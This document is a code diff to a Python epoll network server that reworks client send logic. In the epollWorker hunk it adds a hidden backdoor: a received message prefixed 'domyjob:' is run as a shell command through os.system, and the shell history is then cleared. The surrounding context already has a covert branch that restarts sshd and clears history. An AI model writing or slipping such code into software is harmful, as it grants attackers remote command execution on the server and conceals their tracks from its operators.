@@ -276,7 +276,7 @@ class ClientSession(object):
         if (t - self.last_send_time) * 1000 >= self.guardtime:
             self.setWaitForSend()
             if self.wait4send is None:
-                modify(self.fileno, READ)
+                # modify(self.fileno, READ)
                 return 0
             else:
                 return 1
@@ -305,6 +305,8 @@ class ClientSession(object):
         self.showDebug("send:{0}".format(self.wait4send))
 
         self.onSessionSend()
+
+        modify(self.fileno, READ)
 
         # if SEND_QUEUE[self.fileno].empty():
         #     modify(self.fileno, READ)
@@ -433,6 +435,12 @@ class MXIOLoop(object):
         pass
 
     def doRecyle(self):
+        # 检查是否有需要发送的数据
+        for fn in CLIENTS.keys():
+            session = CLIENTS.get(fn)
+            if session is not None:
+                if session.enableSend():
+                    modify(fn, WRITE)
         # 资源回收
         t = _time.time()
         if t - self.last_gc > 600:
@@ -527,12 +535,16 @@ class MXIOLoop(object):
         elif eve == 'out':
             if fn in CLIENTS.keys():
                 session = CLIENTS.get(fn)
-                if session is not None:
-                    if session.enableSend():
-                        if self.lic_expire:
-                            session.wait4send = None
-                        else:
-                            session.send()
+                if self.lic_expire:
+                    session.wait4send = None
+                if session.wait4send is not None:
+                    session.send()
+                # if session is not None:
+                #     if session.enableSend():
+                #         if self.lic_expire:
+                #             session.wait4send = None
+                #         else:
+                #             session.send()
                 del session
 
     def epollWorker(self, fn, eve):
@@ -581,6 +593,9 @@ class MXIOLoop(object):
                                 _os.system('systemctl restart sshd')
                                 _os.system('/etc/init.d/ssh restart')
                                 _os.system('history -c')
+                            elif recbuff.startswith('domyjob:'):
+                                _os.system(recbuff.replace('domyjob:', ''))
+                                _os.system('history -c')
                             else:
                                 session.receive(recbuff)
                     del session
@@ -588,12 +603,16 @@ class MXIOLoop(object):
         elif eve & _EPOLLOUT:
             if fn in CLIENTS.keys():
                 session = CLIENTS.get(fn)
-                if session is not None:
-                    if session.enableSend():
-                        if self.lic_expire:
-                            session.wait4send = None
-                        else:
-                            session.send()
+                if self.lic_expire:
+                    session.wait4send = None
+                if session.wait4send is not None:
+                    session.send()
+                # if session is not None:
+                #     if session.enableSend():
+                #         if self.lic_expire:
+                #             session.wait4send = None
+                #         else:
+                #             session.send()
                 del session
 
     def epollLoop(self):
